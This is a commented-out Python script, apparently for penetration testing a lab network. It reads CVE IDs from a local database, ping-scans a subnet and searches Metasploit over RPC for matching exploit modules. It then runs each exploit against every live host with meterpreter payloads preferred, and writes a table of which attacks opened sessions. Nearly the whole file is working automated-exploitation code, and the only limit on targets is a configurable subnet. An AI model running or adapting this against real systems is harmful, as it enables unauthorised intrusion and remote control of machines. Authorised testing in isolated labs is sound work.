# import sqlite3
# import nmap
# from pymetasploit3.msfrpc import MsfRpcClient
# from prettytable import PrettyTable
# import ipaddress
# import time

# # CONFIGURATION
# DB_PATH = 'cves.db'  # Path to your CVE database
# MSF_PASSWORD = 'msf'  # Metasploit RPC password
# MSF_HOST = '127.0.0.1'
# MSF_PORT = 55553
# SUBNET = '192.168.56.0/24'  # Example VirtualBox Host-Only subnet
# REPORT_PATH = 'pentest_report.txt'

# # 1. Fetch CVEs from DB
# def fetch_cves():
#     try:
#         conn = sqlite3.connect(DB_PATH)
#         cur = conn.cursor()
#         cur.execute('SELECT cve_id, description FROM cves')
#         cves = cur.fetchall()
#         conn.close()
#         return cves
#     except Exception as e:
#         print(f"[!] Error fetching CVEs: {e}")
#         return []

# # 2. Map CVEs to exploits (improved mapping)
# def map_cve_to_exploit(client, cve_id):
#     try:
#         results = client.modules.search(cve_id)
#         exploits = [m for m in results if m.get('type') == 'exploit']
#         if not exploits:
#             print(f"[!] No exploits found for {cve_id}")
#             return None
#         # Prefer remote exploits
#         for module in exploits:
#             if 'remote' in module.get('fullname', ''):
#                 return module.get('fullname')
#         # Otherwise, return the first exploit
#         return exploits[0].get('fullname')
#     except Exception as e:
#         print(f"[!] Error searching for exploit for {cve_id}: {e}")
#         return None

# # 3. Scan subnet for live hosts
# def scan_subnet(subnet):
#     try:
#         nm = nmap.PortScanner()
#         nm.scan(hosts=subnet, arguments='-sn')
#         hosts = [h for h in nm.all_hosts() if nm[h].state() == 'up']
#         return hosts
#     except Exception as e:
#         print(f"[!] Error scanning subnet: {e}")
#         return []

# # 4. Run exploit using Metasploit RPC (improved)
# def run_exploit(client, exploit, rhost):
#     try:
#         exploit_mod = client.modules.use('exploit', exploit)
#         print(f"[*] Exploit options for {exploit}: {exploit_mod.options}")
#         # Only run exploits that support RHOSTS
#         if 'RHOSTS' not in exploit_mod.options:
#             print(f"[!] Skipping exploit {exploit}: does not support RHOSTS.")
#             return False
#         exploit_mod['RHOSTS'] = rhost
#         # Set RPORT if required and possible
#         if 'RPORT' in exploit_mod.options:
#             # Try to guess RPORT from exploit name or use common ports
#             if 'ftp' in exploit.lower():
#                 exploit_mod['RPORT'] = 21
#             elif 'ssh' in exploit.lower():
#                 exploit_mod['RPORT'] = 22
#             elif 'telnet' in exploit.lower():
#                 exploit_mod['RPORT'] = 23
#             elif 'http' in exploit.lower():
#                 exploit_mod['RPORT'] = 80
#             elif 'smb' in exploit.lower():
#                 exploit_mod['RPORT'] = 445
#             # Add more heuristics as needed

#         payloads = exploit_mod.targetpayloads()
#         if not payloads:
#             print(f"[!] No payloads available for {exploit}")
#             return False
#         # Prefer meterpreter payloads if available
#         meterpreter_payloads = [p for p in payloads if 'meterpreter' in p]
#         payload = meterpreter_payloads[0] if meterpreter_payloads else payloads[0]
#         print(f"[*] Using payload: {payload}")
#         exploit_mod.execute(payload=payload)
#         time.sleep(7)  # Wait longer for session creation
#         sessions = client.sessions.list
#         print(f"[*] Sessions after exploit: {sessions}")
#         return len(sessions) > 0
#     except Exception as e:
#         print(f"[!] Error running exploit {exploit} on {rhost}: {e}")
#         return False

# # 5. Main pentest logic
# def pentest():
#     cves = fetch_cves()
#     if not cves:
#         print("[!] No CVEs found. Exiting.")
#         return
#     hosts = scan_subnet(SUBNET)
#     if not hosts:
#         print("[!] No live hosts found. Exiting.")
#         return
#     try:
#         client = MsfRpcClient(MSF_PASSWORD, server=MSF_HOST, port=MSF_PORT)
#     except Exception as e:
#         print(f"[!] Error connecting to Metasploit RPC: {e}")
#         return
#     results = []
#     print(f"Found {len(cves)} CVEs in database.")
#     print(f"Found {len(hosts)} live hosts in subnet.")
#     for cve_id, desc in cves:
#         exploit = map_cve_to_exploit(client, cve_id)
#         if not exploit:
#             print(f"No exploit found for {cve_id}")
#             continue
#         for host in hosts:
#             print(f"Running exploit {exploit} for {cve_id} on {host}")
#             success = run_exploit(client, exploit, host)
#             if success:
#                 print(f"Exploit {exploit} for {cve_id} on {host} succeeded.")
#             else:
#                 print(f"Exploit {exploit} for {cve_id} on {host} failed.")
#             results.append((host, cve_id, exploit, 'Success' if success else 'Fail'))
#     generate_report(results)

# # 6. Generate report
# def generate_report(results):
#     table = PrettyTable(['Host', 'CVE', 'Exploit', 'Result'])
#     for row in results:
#         table.add_row(row)
#     with open(REPORT_PATH, 'w') as f:
#         f.write(str(table))
#     print(f'Report generated at {REPORT_PATH}')

# if __name__ == '__main__':
#     pentest()